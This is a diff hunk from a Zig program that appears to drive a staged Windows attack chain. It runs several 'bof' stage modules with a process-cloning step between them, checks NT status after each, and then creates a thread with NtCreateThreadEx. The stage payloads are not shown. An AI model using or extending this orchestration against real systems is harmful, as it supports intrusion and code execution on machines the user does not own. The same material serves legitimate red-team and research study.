@@ -77,23 +77,46 @@ pub fn main() !void {
     const ctx_stage0 = try bof_stage0.run(args.getBuffer());
     defer ctx_stage0.release();
     std.debug.print("nt status: {d}\n", .{state.nt_status});
+    if (state.nt_status != .SUCCESS) return;
 
     {
-        const ctx = try bof_clone_process.run(args.getBuffer());
+        const ctx = try bof_clone_process.run(null);
         defer ctx.release();
+        if (ctx.getExitCode() == 0) return;
     }
 
     const ctx_stage1 = try bof_stage1.run(args.getBuffer());
     defer ctx_stage1.release();
     std.debug.print("nt status: {d}\n", .{state.nt_status});
+    if (state.nt_status != .SUCCESS) return;
+
+    {
+        const ctx = try bof_clone_process.run(null);
+        defer ctx.release();
+        if (ctx.getExitCode() == 0) return;
+    }
 
     const ctx_stage2 = try bof_stage2.run(args.getBuffer());
     defer ctx_stage2.release();
     std.debug.print("nt status: {d}\n", .{state.nt_status});
+    if (state.nt_status != .SUCCESS) return;
+
+    {
+        const ctx = try bof_clone_process.run(null);
+        defer ctx.release();
+        if (ctx.getExitCode() == 0) return;
+    }
 
     const ctx_stage3 = try bof_stage3.run(args.getBuffer());
     defer ctx_stage3.release();
     std.debug.print("nt status: {d}\n", .{state.nt_status});
+    if (state.nt_status != .SUCCESS) return;
+
+    {
+        const ctx = try bof_clone_process.run(null);
+        defer ctx.release();
+        if (ctx.getExitCode() == 0) return;
+    }
 
     var thread_handle: w32.HANDLE = undefined;
     state.nt_status = w32.NtCreateThreadEx(
